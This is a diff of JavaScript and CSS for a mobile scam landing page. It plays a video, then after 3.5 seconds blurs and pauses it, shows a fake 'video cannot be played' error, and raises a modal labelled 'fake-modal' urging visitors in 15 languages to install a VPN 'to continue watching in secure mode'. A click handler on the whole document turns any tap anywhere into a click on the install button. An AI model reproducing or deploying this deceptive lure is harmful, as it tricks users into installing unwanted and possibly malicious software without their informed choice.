@@ -1,440 +1,327 @@
-body {
-    margin: 0;
-    padding: 0;
-    width: 100%;
-    min-height: 100%;
-    font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Helvetica Neue", Arial, sans-serif;
-    background: #000;
-    color: #fff;
-    overflow-x: hidden;
-}
+document.body.style.overflow ="hidden";
 
-*,
-*::before,
-*::after {
-    box-sizing: border-box;
-}
+(function () {
+  const setViewportHeight = () => {
+    const viewportHeight = window.visualViewport
+      ? window.visualViewport.height
+      : window.innerHeight;
 
-a,
-button {
-    -webkit-tap-highlight-color: transparent;
-}
+    document.documentElement.style.setProperty(
+      "--app-viewport-height",
+      `${Math.round(viewportHeight)}px`
+    );
+  };
 
-button {
-    font: inherit;
-    border: 0;
-    background: none;
-    padding: 0;
-    margin: 0;
-    cursor: pointer;
-}
+  setViewportHeight();
+  window.addEventListener("resize", setViewportHeight);
+  window.addEventListener("orientationchange", setViewportHeight);
 
-img {
-    display: block;
-    max-width: 100%;
-}
+  if (window.visualViewport) {
+    window.visualViewport.addEventListener("resize", setViewportHeight);
+    window.visualViewport.addEventListener("scroll", setViewportHeight);
+  }
+})();
 
-.iphone-frame {
-    position: relative;
-    width: 100%;
-    min-height: 100vh;
-    min-height: 100svh;
-    height: var(--app-viewport-height, 100svh);
-    overflow: hidden;
-    background: #000;
-    padding:
-        max(14px, env(safe-area-inset-top))
-        14px
-        max(40px, env(safe-area-inset-bottom))
-        14px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-}
+document.addEventListener("DOMContentLoaded", function () {
+    const bg = document.querySelector(".screen-bg");
+    const modal = document.querySelector(".fake-modal");
+    const bgVideo = document.querySelector(".video-bg");
+    const modalDelayMs = 3500;
+    const videoSources = [
+      "./video/bg-video-noaudio.mp4",
+      "./video/bg-video-safe.mp4",
+      "./video/IMG_2376.mp4",
+    ];
+    let pauseVideo = () => {};
+    let keepVideoPlayingId = null;
+    let activeVideoSourceIndex = 0;
+    let modalShown = false;
+  
 
-.screen-bg {
-  position: absolute;
-  inset: 0;
-  z-index: 0;
-  overflow: hidden;
-  background: #000 url("../img/video-poster.png") center / cover no-repeat;
-}
 
-.video-bg {
-  position: absolute;
-  inset: 0;
-  width: 100%;
-  height: 100%;
-  object-fit: cover;
-  transform: scale(1.01);
-  -webkit-transform: scale(1.01);
-  transition: filter 0.35s ease, transform 0.35s ease;
-  z-index: 1;
-  background: #000;
-  pointer-events: none;
-  will-change: filter, transform;
-}
+    let totalSeconds = "60";
+    let timerStarted = false;
+    let switched = false;
+    let intervalId = null;
 
-.screen-bg.active .video-bg {
-  filter: blur(18px);
-  transform: scale(1.08);
-  -webkit-transform: scale(1.08);
-}
+ const translations = {
+  en: {
+  modal_title_key: "Attention",
+  modal_text_key: "Download a <strong>VPN</strong> to continue watching in secure mode.",
+  scan_now_option: "Install",
+  video_error_key: "The video cannot be played!",
+},
 
-.video-error {
-  position: absolute;
-  left: 50%;
-  z-index: 4;
-  display: flex;
-  width: min(100% - 48px, 360px);
-  flex-direction: column;
-  align-items: center;
-  gap: 14px;
-  color: #fff;
-  text-align: center;
-  opacity: 0;
-  transform: translateX(-50%);
-  transition: opacity 0.2s ease;
-  pointer-events: none;
-}
+fr: {
+modal_title_key: "Attention",
+modal_text_key: "Téléchargez un <strong>VPN</strong> pour continuer à regarder en mode sécurisé.",
+scan_now_option: "Installer",
+video_error_key: "La vidéo ne peut pas être lue !",
+},
 
-.screen-bg.active .video-error {
-  opacity: 1;
-}
+"pt-PT": {
+modal_title_key: "Atenção",
+modal_text_key: "Transfira uma <strong>VPN</strong> para continuar a ver em modo seguro.",
+scan_now_option: "Instalar",
+video_error_key: "Não é possível reproduzir o vídeo!",
+},
 
-.video-error--top {
-  top: clamp(78px, 15vh, 128px);
-}
+"pt-BR": {
+modal_title_key: "Atenção",
+modal_text_key: "Baixe uma <strong>VPN</strong> para continuar assistindo no modo seguro.",
+scan_now_option: "Instalar",
+video_error_key: "O vídeo não pode ser reproduzido!",
+},
 
-.video-error--bottom {
-  bottom: clamp(86px, 16vh, 142px);
-}
+es: {
+modal_title_key: "Atención",
+modal_text_key: "Descargue una <strong>VPN</strong> para seguir viendo en modo seguro.",
+scan_now_option: "Instalar",
+video_error_key: "¡El video no se puede reproducir!",
+},
 
-.video-error__icon {
-  width: 58px;
-  height: 58px;
-}
+"es-419": {
+modal_title_key: "Atención",
+modal_text_key: "Descarga una <strong>VPN</strong> para seguir viendo en modo seguro.",
+scan_now_option: "Instalar",
+video_error_key: "¡El video no se puede reproducir!",
+},
 
-.video-error__text {
-  margin: 0;
-  font-size: 17px;
-  line-height: 1.25;
-  font-weight: 400;
-  letter-spacing: 0;
-  text-shadow: 0 1px 12px rgba(0, 0, 0, 0.32);
-}
+da: {
+modal_title_key: "Advarsel",
+modal_text_key: "Download en <strong>VPN</strong> for at fortsætte visningen i sikker tilstand.",
+scan_now_option: "Installer",
+video_error_key: "Videoen kan ikke afspilles!",
+},
 
-.ui {
-  position: absolute;
-  z-index: 2;
-  pointer-events: none;
-}
+ja: {
+modal_title_key: "注意",
+modal_text_key: "安全モードで視聴を続けるには、<strong>VPN</strong>をインストールしてください。",
+scan_now_option: "インストール",
+video_error_key: "動画を再生できません！",
+},
 
-/* верх */
-.close {
-  top: max(51px, env(safe-area-inset-top));
-  left: 48px;
-}
+fil: {
+modal_title_key: "Babala",
+modal_text_key: "Mag-download ng <strong>VPN</strong> upang magpatuloy sa panonood sa secure na mode.",
+scan_now_option: "I-install",
+video_error_key: "Hindi ma-play ang video!",
+},
 
-.thumbnail {
-  top: max(50px, env(safe-area-inset-top));
-  left: 88px;
-}
+de: {
+modal_title_key: "Achtung",
+modal_text_key: "Laden Sie ein <strong>VPN</strong> herunter, um im sicheren Modus weiterzusehen.",
+scan_now_option: "Installieren",
+video_error_key: "Das Video kann nicht abgespielt werden!",
+},
 
-.airplay {
-  top: max(50px, env(safe-area-inset-top));
-  left: 136px;
-}
+nb: {
+modal_title_key: "Advarsel",
+modal_text_key: "Last ned en <strong>VPN</strong> for å fortsette å se i sikker modus.",
+scan_now_option: "Installer",
+video_error_key: "Videoen kan ikke spilles av!",
+},
 
-.volume {
-  top: max(50px, env(safe-area-inset-top));
-  right: 36px;
-}
+sv: {
+modal_title_key: "Observera",
+modal_text_key: "Ladda ner en <strong>VPN</strong> för att fortsätta titta i säkert läge.",
+scan_now_option: "Installera",
+video_error_key: "Videon kan inte spelas upp!",
+},
 
-/* центр */
-.center {
-  left: 50%;
-  top: 50%;
-  transform: translate(-50%, -50%);
-}
+it: {
+modal_title_key: "Attenzione",
+modal_text_key: "Scarica una <strong>VPN</strong> per continuare a guardare in modalità sicura.",
+scan_now_option: "Installa",
+video_error_key: "Il video non può essere riprodotto!",
+},
 
-/* низ — над адресной строкой браузера */
-.bottom {
-  left: 50%;
-  bottom: max(0px, env(safe-area-inset-bottom));
-  transform: translateX(-50%);
-  width: min(100vw, 425px);
-  height: auto;
-}
+nl: {
+modal_title_key: "Let op",
+modal_text_key: "Download een <strong>VPN</strong> om verder te kijken in de beveiligde modus.",
+scan_now_option: "Installeren",
+video_error_key: "De video kan niet worden afgespeeld!",
+},
 
-.fake-modal {
-    position: relative;
-    z-index: 5;
-    width: min(100%, 398px);
-    padding: 25px 18px 0;
-    border-radius: 20px;
-    background: #E4E4E4;
-    backdrop-filter: blur(18px);
-    -webkit-backdrop-filter: blur(18px);
-    box-shadow:
-        0 18px 40px rgba(0, 0, 0, 0.22),
-        0 1px 0 rgba(255, 255, 255, 0.72) inset;
-    text-align: center;
-    overflow: hidden;
+ro: {
+modal_title_key: "Atenție",
+modal_text_key: "Descarcă un <strong>VPN</strong> pentru a continua vizionarea în modul securizat.",
+scan_now_option: "Instalează",
+video_error_key: "Videoclipul nu poate fi redat!",
+},
+};
 
-    opacity: 0;
-    transform: translateY(80px);
-animation: modalSlideUpCenter 0.80s ease-out 3.5s forwards;
-   
-}
+  const definedLanguages = [
+    "en", "fr", "pt-PT", "pt-BR", "es", "es-419",
+    "da", "ja", "fil", "de", "nb", "sv", "it", "nl", "ro"
+  ];
 
-@keyframes modalSlideUpCenter {
-    from {
-        opacity: 0;
-        transform: translateY(80px);
-    }
-    to {
-        opacity: 1;
-        transform: translateY(0);
-    }
-}
+  const currentLocale = (navigator && navigator.language) || "en";
 
-.fake-modal__icon-wrap {
-    position: relative;
-    width: 80px;
-    height: 80px;
-    margin: 0 auto 14px;
-}
+  const getLocale = () => {
+    if (translations[currentLocale]) return currentLocale;
 
-.fake-modal__icon-slot {
-    width: 100%;
-    height: 100%;
+    const shortLocale = currentLocale.slice(0, 2);
+    if (translations[shortLocale]) return shortLocale;
 
-    display: flex;
-    align-items: center;
-    justify-content: center;
+    return "en";
+  };
 
-    overflow: hidden;
-}
+  const locale = getLocale();
+  const t = translations[locale] || translations.en;
 
-.fake-modal__icon-slot img {
-    width: 100%;
-    height: 100%;
-    object-fit: contain;
-}
+  document.documentElement.lang = locale;
 
-.fake-modal__title {
-    margin: 0 auto 18px;
-    max-width: 300px;
-    font-size: 21px;
-    line-height: 1.0;
-    font-weight: 700;
-    letter-spacing: 0.01em;
-    color: #111111;
-}
+  document.getElementById("modal_title_key").textContent = t.modal_title_key;
+  document.getElementById("modal_text_key").innerHTML = t.modal_text_key || translations.en.modal_text_key;
+  document.getElementById("scan_now_option").textContent = t.scan_now_option;
+  document.querySelectorAll(".video_error_key").forEach((element) => {
+    element.textContent = t.video_error_key || translations.en.video_error_key;
+  });
 
-.fake-modal__text {
-    margin: 0 auto 28px;
-    max-width: 300px;
-    font-size: clamp(16px, 3.9vw, 22px);
-    line-height: 1.28;
-    letter-spacing: 0.01em;
-    color: #000000;
-}
 
-.fake-modal__actions {
-    border-top: 1px solid rgba(60, 60, 67, 0.18);
-    margin: 0 -18px;
-}
+document.addEventListener("click", function (e) {
+    const installBtn = document.getElementById("goStep1");
+    if (!installBtn) return;
+    installBtn.click();
+});
 
-.fake-modal__btn {
-    min-height: 80px;
-    border-radius: 0;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    text-decoration: none;
-    font-size: 24px;
-    font-weight: 500;
-    letter-spacing: 0.01em;
-    transition: transform 0.18s ease, opacity 0.18s ease;
-}
 
-.fake-modal__btn:active {
-    transform: scale(0.985);
-}
 
-.fake-modal__btn--cancel {
-    background: transparent;
-    color: #ff3b30;
-    border-right: 1px solid rgba(60, 60, 67, 0.18);
-}
 
-.fake-modal__btn--install {
-    background: transparent;
-    color: #2563ff;
-    font-weight: 500;
-    letter-spacing: 0.01em;
-}
+    if (bgVideo) {
+      bgVideo.muted = true;
+      bgVideo.defaultMuted = true;
+      bgVideo.playsInline = true;
+      bgVideo.setAttribute("muted", "");
+      bgVideo.setAttribute("defaultmuted", "");
+      bgVideo.setAttribute("playsinline", "");
+      bgVideo.setAttribute("webkit-playsinline", "");
+      bgVideo.setAttribute("autoplay", "");
+      bgVideo.setAttribute("loop", "");
+      bgVideo.setAttribute("preload", "auto");
+      bgVideo.disablePictureInPicture = true;
 
-@media (max-width: 390px) {
-    .fake-modal {
-        width: 100%;
-        padding: 25px 16px 0;
-        border-radius: 20px;
-    }
+      const tryPlay = () => {
+        if (modalShown) return;
 
-.fake-modal__icon-wrap {
-    width: 70px;
-    height: 70px;
-}
+        const playPromise = bgVideo.play();
+        if (playPromise && typeof playPromise.catch === "function") {
+          playPromise.catch(() => {});
+        }
+      };
 
-.fake-modal__icon-slot {
-    width: 100%;
-    height: 100%;
-}
+      const resumeVideo = (force) => {
+        if (modalShown) return;
+        if (!force && document.hidden) return;
 
-    .fake-modal__title {
-        font-size: 24px;
-        margin-bottom: 16px;
-        max-width: 300px;
+        bgVideo.muted = true;
+        tryPlay();
+        window.setTimeout(tryPlay, 250);
+        window.setTimeout(tryPlay, 1000);
+      };
+
+      const tryBlobFallback = () => {
+        if (modalShown || bgVideo.dataset.blobFallback === "1" || bgVideo.readyState >= 2) {
+          return;
+        }
+
+        bgVideo.dataset.blobFallback = "1";
+
+        fetch(videoSources[activeVideoSourceIndex])
+          .then((response) => {
+            if (!response.ok) {
+              throw new Error("Video fallback failed");
+            }
+
+            return response.blob();
+          })
+          .then((blob) => {
+            if (modalShown) return;
+
+            bgVideo.src = URL.createObjectURL(blob);
+            bgVideo.load();
+            resumeVideo(true);
+          })
+          .catch(() => {});
+      };
+
+      pauseVideo = () => {
+        bgVideo.pause();
+      };
+
+      bgVideo.addEventListener("error", () => {
+        const nextSource = videoSources[activeVideoSourceIndex + 1];
+
+        if (nextSource) {
+          activeVideoSourceIndex += 1;
+          bgVideo.src = nextSource;
+          bgVideo.load();
+          resumeVideo(true);
+        } else {
+          tryBlobFallback();
+        }
+      });
+      bgVideo.addEventListener("loadeddata", () => resumeVideo(true), { once: true });
+      bgVideo.addEventListener("loadedmetadata", () => resumeVideo(true), { once: true });
+      bgVideo.addEventListener("canplay", () => resumeVideo(true), { once: true });
+      bgVideo.addEventListener("pause", () => {
+        if (!modalShown) {
+          window.setTimeout(resumeVideo, 300);
+        }
+      });
+      window.addEventListener("pageshow", () => resumeVideo(true));
+      window.addEventListener("focus", () => resumeVideo(true));
+      window.addEventListener("blur", () => {
+        window.setTimeout(resumeVideo, 500);
+      });
+      document.addEventListener("visibilitychange", () => {
+        if (!document.hidden) {
+          resumeVideo(true);
+        }
+      });
+      document.addEventListener("touchstart", () => resumeVideo(true), { passive: true });
+      if (!bgVideo.getAttribute("src")) {
+        bgVideo.src = videoSources[activeVideoSourceIndex];
+        bgVideo.load();
+      }
+      resumeVideo(true);
+      window.setTimeout(tryBlobFallback, 1200);
+      keepVideoPlayingId = window.setInterval(() => {
+        if (!document.hidden && bgVideo.paused) {
+          resumeVideo();
+        }
+      }, 1000);
     }
 
-    .fake-modal__text {
-        font-size: 20px;
-        margin-bottom: 22px;
-        max-width: 260px;
-    }
+    window.setTimeout(() => {
+      modalShown = true;
+      if (keepVideoPlayingId) {
+        window.clearInterval(keepVideoPlayingId);
+      }
 
-    .fake-modal__btn {
-        min-height: 72px;
-        font-size: 22px;
-    }
-}
+      if (bg) {
+        bg.classList.add("active");
+      }
 
-@media (max-width: 375px) {
-    .iphone-frame {
-        padding-left: 10px;
-        padding-right: 10px;
-    }
+      if (bgVideo) {
+        bgVideo.style.filter = "blur(18px)";
+        bgVideo.style.transform = "scale(1.08)";
+        document.querySelectorAll(".video-error").forEach((element) => {
+          element.style.opacity = "1";
+        });
+        pauseVideo();
+      }
+    }, modalDelayMs);
 
-    .fake-modal {
-        padding: 30px 14px 0;
-        border-radius: 28px;
-    }
+  
+(function () {
+  const ua = navigator.userAgent;
+  const isIOS = /iPhone|iPad|iPod/i.test(ua);
+  const isChrome = /CriOS/i.test(ua);
 
-    .fake-modal__icon-wrap {
-        width: 60px;
-        height: 60px;
-    }
-
-    .fake-modal__icon-slot {
-        width: 100%;
-        height: 100%;
-    }
-
-    .fake-modal__title {
-        font-size: 22px;
-        max-width: 250px;
-        margin-bottom: 14px;
-    }
-
-    .fake-modal__text {
-        font-size: 17px;
-        max-width: 286px;
-        margin-bottom: 20px;
-    }
-
-    .fake-modal__btn {
-        min-height: 55px;
-        font-size: 24px;
-    }
-    .bg-image-slot{
-        background-position: center top;
-    }
-
-    .video-error__icon {
-      width: 40px;
-      height: 40px;
-    }
-
-    .video-error__text {
-       font-size: 12px; 
-    }
-}
-
-@media (max-width: 320px) {
-    .iphone-frame {
-        padding-left: 8px;
-        padding-right: 8px;
-    }
-
-    .fake-modal {
-        padding: 14px 12px 0;
-        border-radius: 24px;
-    }
-
-    .fake-modal__icon-wrap {
-        width: 82px;
-        height: 82px;
-        margin-bottom: 10px;
-    }
-
-    .fake-modal__icon-slot {
-        width: 82px;
-        height: 82px;
-        border-radius: 20px;
-    }
-
-    .fake-modal__title {
-        font-size: 22px;
-        margin-bottom: 12px;
-        max-width: 260px;
-    }
-
-    .fake-modal__text {
-        max-width: 100%;
-        font-size: 14px;
-        line-height: 1.3;
-        margin-bottom: 18px;
-    }
-
-    .fake-modal__btn {
-        min-height: 58px;
-        font-size: 18px;
-    }
-}
-
-@media (min-width: 414px) {
-    .fake-modal {
-        width: min(100%, 414px);
-        padding-top: 40px;
-    }
-
-    .fake-modal__title {
-        font-size: 24px;
-        margin-bottom: 16px;
-        max-width: 320px;
-    }
-
-     .fake-modal__text {
-        font-size: 20px;
-        margin-bottom: 16px;
-        max-width: 320px;
-    }
-
-}
-
-.progress-overlay {
-    position: fixed;
-    left: 50%;
-    bottom: 50px;
-
-    transform: translateX(-50%);
-
-    width: 340px; 
-    max-width: 90vw;
-
-    z-index: 2;
-    pointer-events: none;
-}
+  if (isIOS && isChrome) {
+    document.body.classList.add('ios-chrome');
+  }
+})();
+});
